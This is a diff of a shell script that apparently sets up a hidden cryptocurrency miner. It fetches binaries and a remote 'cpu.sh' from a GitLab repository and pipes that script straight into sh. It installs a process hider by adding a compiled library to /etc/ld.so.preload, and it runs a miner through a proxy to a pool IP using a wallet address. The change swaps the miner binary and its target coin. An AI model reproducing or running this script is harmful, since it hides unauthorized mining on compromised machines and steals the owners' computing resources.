@@ -14,9 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/gm3.43
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.90
 
-chmod 777 gm3.43
+chmod 777 lol1.90
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gm3.43 -a firo -s 167.172.24.221:80 -u aBzsYiZ1AJ7SDTyL4o4FmdNipWE5qAx3kk.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.90 --algo PYRINV2 --pool 167.172.24.221:443 --user pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
